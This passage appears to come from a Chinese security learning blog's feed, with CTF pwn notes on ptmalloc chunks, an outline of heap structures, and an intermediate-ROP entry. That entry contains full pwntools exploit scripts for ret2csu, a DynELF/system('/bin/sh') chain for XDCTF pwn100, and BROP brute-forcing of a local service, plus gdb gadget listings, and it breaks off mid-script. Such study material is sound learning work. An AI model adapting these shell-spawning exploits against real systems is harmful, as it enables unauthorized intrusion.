头部的16个字节。实际上用户可用chunk的字节数为16。而根据我们前面学到的知识可以知道chunk的pre_size仅当它的前一块块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个chunk的prev_size字段，正好24个字节。</p><p><strong>实际上 ptmalloc 分配内存是以双字为基本单位，以64位系统为例，分配出来的空间是16的整数倍，即用户申请的chunk都是16字节对齐的。</strong></p><p>(注意机器字长的影响)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>堆的数据结构</title>
      <link href="/2020/01/20/%E5%A0%86%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2020/01/20/%E5%A0%86%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="堆的数据结构"><a href="#堆的数据结构" class="headerlink" title="堆的数据结构"></a>堆的数据结构</h1><a id="more"></a><p>最近状态不大好，栈溢出也学一阵子了，向堆的方向前进吧</p><p>先简单的记录一下知识结构</p><h2 id="1-malloc-chunk"><a href="#1-malloc-chunk" class="headerlink" title="1.malloc_chunk"></a>1.malloc_chunk</h2><h2 id="2-chunk"><a href="#2-chunk" class="headerlink" title="2.chunk"></a>2.chunk</h2><h3 id="chunk的数据结构"><a href="#chunk的数据结构" class="headerlink" title="chunk的数据结构"></a>chunk的数据结构</h3><h4 id="1-使用时"><a href="#1-使用时" class="headerlink" title="1.使用时"></a>1.使用时</h4><h4 id="2-空闲时间"><a href="#2-空闲时间" class="headerlink" title="2.空闲时间"></a>2.空闲时间</h4><h2 id="3-bin"><a href="#3-bin" class="headerlink" title="3.bin"></a>3.bin</h2><h3 id="1-fast-bin"><a href="#1-fast-bin" class="headerlink" title="1.fast bin"></a>1.fast bin</h3><h3 id="2-其他的"><a href="#2-其他的" class="headerlink" title="2.其他的"></a>2.其他的</h3><h4 id="2-small-bin"><a href="#2-small-bin" class="headerlink" title="2.small bin"></a>2.small bin</h4><h4 id="3-large-bin"><a href="#3-large-bin" class="headerlink" title="3.large bin"></a>3.large bin</h4><h4 id="4-unsorted-bin"><a href="#4-unsorted-bin" class="headerlink" title="4.unsorted bin"></a>4.unsorted bin</h4><h4 id="4-arena"><a href="#4-arena" class="headerlink" title="4.arena"></a>4.arena</h4><h2 id="5-heap-info"><a href="#5-heap-info" class="headerlink" title="5.heap_info"></a>5.heap_info</h2><h2 id="6-malloc-state"><a href="#6-malloc-state" class="headerlink" title="6.malloc_state"></a>6.malloc_state</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>中级ROP</title>
      <link href="/2020/01/14/%E4%B8%AD%E7%BA%A7ROP/"/>
      <url>/2020/01/14/%E4%B8%AD%E7%BA%A7ROP/</url>
      
        <content type="html"><![CDATA[<h1 id="中级ROP"><a href="#中级ROP" class="headerlink" title="中级ROP"></a>中级ROP</h1><a id="more"></a><p>64位程序传参</p><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样</p><h2 id="ret2-libc-csu-init"><a href="#ret2-libc-csu-init" class="headerlink" title="ret2__libc_csu_init"></a>ret2__libc_csu_init</h2><p>看ctf-wiki</p><p>其中一个关于rsp移动的问题，就是payload中有一个 “a” * 0x38的具体解释见如下博客，感谢大佬</p><p><a href="https://blog.csdn.net/zszcr/article/details/79833898" target="_blank" rel="noopener">https://blog.csdn.net/zszcr/article/details/79833898</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">level5 = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">sh = process(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">write_got = level5.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = level5.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = level5.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_base = level5.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x0000000000400600</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040061A</span></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span> <span class="comment">#这里的r12 r13 r14 分别为第三 第二 第一个参数</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span></span><br><span class="line"><span class="comment">## write(1,write_got,8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">execve_addr = libc_base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line">log.success(<span class="string">'execve_addr '</span> + hex(execve_addr))</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## read(0,bss_base,16)</span></span><br><span class="line"><span class="comment">## read execve_addr and /bin/sh\x00</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">16</span>, bss_base, <span class="number">0</span>, main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment">## execve(bss_base+8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_base, <span class="number">0</span>, <span class="number">0</span>, bss_base + <span class="number">8</span>, main_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>程序代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure><p>可以通过不同的地址对不同的寄存器使用</p><p>使用不同的gadgets</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;5i 0x000000000040061A</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061b</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061A+3</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret </span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061e</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061f</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">gef➤  x&#x2F;5i 0x0000000000400621</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x&#x2F;5i 0x000000000040061A+9</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret    </span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure><p>例题：</p><p>2016 XDCTF pwn100</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn-100'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn-100'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_addr = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">pop_rdi = <span class="number">0x400763</span> </span><br><span class="line">gadget_1 = <span class="number">0x40075a</span></span><br><span class="line">gadget_2 = <span class="number">0x400740</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x60107c</span>  <span class="comment">#存储/bin/sh的地址</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    up = <span class="string">''</span>     </span><br><span class="line">    content = <span class="string">''</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x48</span></span><br><span class="line">    payload += p64(pop_rdi)         <span class="comment">#这里使用了pop_rdi</span></span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(puts_addr)</span><br><span class="line">    payload += p64(start_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">200</span>, <span class="string">'B'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment">#防止未接受完整传回的数据</span></span><br><span class="line">        c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:</span><br><span class="line">            content = content[:<span class="number">-1</span>]+<span class="string">'\x00'</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            content += c</span><br><span class="line">            up = c</span><br><span class="line">    content = content[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=elf)                <span class="comment">#其实可以使用libsearch来搜索system与bin/sh</span></span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="comment">#调用read函数</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(gadget_1)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(gadget_2)</span><br><span class="line">payload += <span class="string">'\x00'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入/bin/sh</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'bye~\n'</span>)</span><br><span class="line">p.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用system函数</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>1.查看溢出函返回时哪个寄存值指向溢出缓冲区空间</p><p>2.然后反编译二进制，查找 call reg 或者jmp reg指令，将 EIP 设置为该指令地址</p><p>3.reg所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的</p><p>拿一个例题：</p><p>HCTF2016的pwn</p><p>1.我们先爆破出栈溢出的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbufferflow_length</span><span class="params">()</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">'WelCome my friend,Do you know password?\n'</span>)</span><br><span class="line">            sh.send(i * <span class="string">'a'</span>)</span><br><span class="line">            output = sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">'No password'</span>):</span><br><span class="line">                <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:   <span class="comment">#如果报错，会显示EOFErrot</span></span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span></span><br></pre></td></tr></table></figure><p>2.爆破我们需要的gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span><span class="params">(length)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">            payload = <span class="string">'a'</span> * length + p64(addr)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'one success addr: 0x%x'</span> % (addr)  <span class="comment">#若有正常返回，那么存在正确的add，输入即可，若没有，则报错</span></span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure><p>3.识别brop gadgets</p><p>下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_brop_gadget</span><span class="params">(length, stop_gadget, addr)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(</span><br><span class="line">            stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">print</span> content</span><br><span class="line">        <span class="comment"># stop gadget returns memory</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">'WelCome'</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_brop_gadget</span><span class="params">(length, addr)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span> * length + p64(addr) + <span class="string">'a'</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line">addr = <span class="number">0x400740</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">print</span> hex(addr)</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'possible brop gadget: 0x%x'</span> % addr</span><br><span 